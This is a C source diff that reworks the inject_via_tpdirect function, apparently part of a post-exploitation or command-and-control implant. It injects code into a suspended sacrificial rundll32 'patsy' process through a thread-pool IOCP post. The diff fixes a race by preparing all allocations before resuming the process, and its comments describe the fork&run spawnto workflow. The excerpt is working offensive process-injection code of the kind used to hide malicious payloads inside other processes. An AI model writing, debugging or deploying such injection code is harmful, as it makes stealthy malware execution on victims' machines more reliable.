@@ -628,15 +628,13 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 		return FALSE;
 	}
 
-	/* 1. fork&run needs a live pool */
-	if (context->isSuspended && context->hThread != NULL) {
-		if (ResumeThread(context->hThread) == (DWORD)-1) {
-			spawn_log("tpdirect: ResumeThread failed gle=", (long)GetLastError());
-			return FALSE;
-		}
-		Sleep(2000);
-		spawn_log("tpdirect: patsy resumed, pool warmup wait done", 0x7fffffff);
-	}
+	/* 1. fork&run: the patsy is SUSPENDED here - arm EVERYTHING into it
+	 * before the resume. The old order (resume first, allocate after)
+	 * raced a rundll32 spawnto that exits the moment its entry runs:
+	 * allocations then hit a dead process (gle=5) and the whole chain
+	 * fell over. Sequence: arm (suspended) -> resume -> pool warmup ->
+	 * post. */
+	int forkrun = context->isSuspended && context->hThread != NULL;
 
 	HANDLE hProcess = context->hProcess;
 	DWORD pid = context->pid;
@@ -706,6 +704,18 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 		}
 	}
 	spawn_log("tpdirect: direct armed=", (long)(long long)(size_t)direct);
+
+	/* 2b. fork&run: NOW resume - pool comes up during init, the post below
+	 * lands in its IOCP. Allocating after this point raced the rundll32
+	 * spawnto exit (dead process, gle=5). */
+	if (forkrun) {
+		if (ResumeThread(context->hThread) == (DWORD)-1) {
+			spawn_log("tpdirect: ResumeThread failed gle=", (long)GetLastError());
+			return FALSE;
+		}
+		Sleep(2000);
+		spawn_log("tpdirect: patsy resumed, pool warmup wait done", 0x7fffffff);
+	}
 
 	/* 3. handle-table walk + post */
 	ULONG len = 0x100000;
